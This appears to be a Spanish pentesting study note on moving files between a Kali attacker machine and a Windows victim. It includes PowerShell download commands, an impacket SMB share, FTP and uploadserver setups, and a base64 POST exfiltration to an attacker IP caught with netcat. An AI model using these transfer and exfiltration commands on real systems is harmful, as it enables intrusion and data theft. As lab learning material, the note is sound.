# WINDOWS
Para descargar archivos desde nuestra máquina windows, podemos usar el siguiente comando:
```bash
(New-Object Net.WebClient).DownloadFile('http://192.168.0.28/script.py','C:\Users\mario\Desktop\pruebas\script.py')
```
![[Pasted image 20240603090243.png]]
![[Pasted image 20240603090256.png]]
Aunque también podemos descargar archivos de la siguiente forma:
```powershell
Invoke-WebRequest http://192.168.0.28/script.py -OutFile script.py
```
![[Pasted image 20240603090638.png]]
También podemos crear un servidor SMB desde linux para compartir archivos:
Si quiero compartir los archivos de un directorio en un recurso compartido en Windows, debo ubicarme en la carpeta donde los quiera compartir y ejecutar este comando:

![[Pasted image 20221217114627.png]]

Ahora desde la máquina víctima Windows nos descargamos el archivo del recurso compartido, poniendo primero la IP de la máquina Kali que está compartiendo el recurso, luego el nombre del archivo compartido y por último el nombre que le queramos poner:
![[Pasted image 20221217114634.png]]
Incluso también podemos establecer unas credenciales de acceso:
```powerhsell
impacket-smbserver recurso $(pwd) -smb2support -user test -password test
```
![[Pasted image 20240603091343.png]]
Y nos autenticamos de la siguiente forma:
```powershell
net use n: \\192.168.0.28\recurso /user:test test
```
![[Pasted image 20240603091450.png]]
![[Pasted image 20240603091456.png]]
## DESCARGAS FTP
Podemos también crear servidores ftp alojando archivos por ahí para descargarlos desde otra máquina:
```python
python3 -m pyftpdlib --port 21
```
![[Pasted image 20240603091553.png]]
Y podemos descargarlo con el siguiente comando:
```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.0.28/script.py', 'C:\Users\mario\Desktop\pruebas\script.py')
```
![[Pasted image 20240603091720.png]]
![[Pasted image 20240603091726.png]]
## DESCARGAR CON UPLOADSERVER
También podemos levantar un servidor con python con uploadserver:
```python
python3 -m uploadserver
```
![[Pasted image 20240603092001.png]]
Y lo descargamos de esta forma:
```powershell
Invoke-FileUpload -Uri http://192.168.0.28:8000/upload -File C:\Users\mario\Desktop\pruebas\script.py
```
## ENVIAR ARCHIVO DESDE WINDOWS A LINUX
Podemos enviar un archivo desde windows de la siguiente forma:
```powershell
$b64 = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes('C:\Users\mario\Desktop\pruebas\script.py'))

Invoke-WebRequest -Uri http://192.168.0.28:443/ -Method POST -Body $b64
```
![[Pasted image 20240603092316.png]]
Y con netcat lo recibimos:
![[Pasted image 20240603092333.png]]
Lo decodificamos y ya tenemos el archivo:
```bash
echo <base64> | base64 -d -w 0 > hosts
```
![[Pasted image 20240603092405.png]]
# LINUX
